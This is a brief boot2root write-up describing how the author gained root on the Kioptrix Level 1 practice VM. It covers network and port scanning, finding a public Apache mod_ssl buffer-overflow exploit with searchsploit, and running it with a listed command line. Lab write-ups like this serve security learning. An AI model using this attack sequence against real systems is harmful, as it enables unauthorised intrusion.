---
title: "boot2root - Kioptrix Level 1"
date: 2019-02-21T19:44:05+11:00
author: Cameron Wang
description: My Steps/Process of Gaining Root on the Kioptrix Level 1 Machine
---

'boot2root - Kioptrix Level 1' Notes - https://drive.google.com/open?id=1ELx9NS0ONeKRIN5NSrjgSSxfMo-Pl8VN

---
# Kioptrix Level 1 - Rooted
## Gaining Root
Steps/Process:

1. Locating the IP Address of the Vulnerable Machine

	- nmap -sP 192.168.43.0/24: scans the network for other machines and returns their IP and MAC Addresses
	
	- netdiscover -i eth0 -r 192.168.43.0/24: scans the network for other machines and returns their IP and MAC Addresses
	
		- Kioptrix IP Address: 192.168.43.115
		
{{<image src="/img/netdiscover.PNG" alt="netdiscover" position="center" style="border-radius: 8px;">}}
		
2.  nmap -sSV -n -T4 -p 1-5000 192.168.43.115: scans for all open ports on the machine

{{<image src="/img/nmap.PNG" alt="nmap" position="center" style="border-radius: 8px;">}}

3. searchsploit mod_ssl: searches Exploit DB for any mod_ssl exploits
	- Exploit Used: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow
		- URL: https://www.exploit-db.com/exploits/76
		
{{<image src="/img/searchsploit.PNG" alt="searchsploit" position="center" style="border-radius: 8px;">}}
		
4. vim 764.c: the exploit needs to be edited to be properly compiled
	- Guide Used To Compile: https://medium.com/@javarmutt/how-to-compile-openfuckv2-c-69e457b4a1d1
	
{{<image src="/img/vim_764.PNG" alt="vim 764.c" position="center" style="border-radius: 8px;">}}
	
5. ./OpenFuck 0x6b 192.168.43.115 443 -c 50: sends shellcode onto machine
# Machine Rooted

{{<image src="/img/openfuck.PNG" alt="OpenFuckV2" position="center" style="border-radius: 8px;">}}
{{<image src="/img/whoami.PNG" alt="root" position="center" style="border-radius: 8px;">}}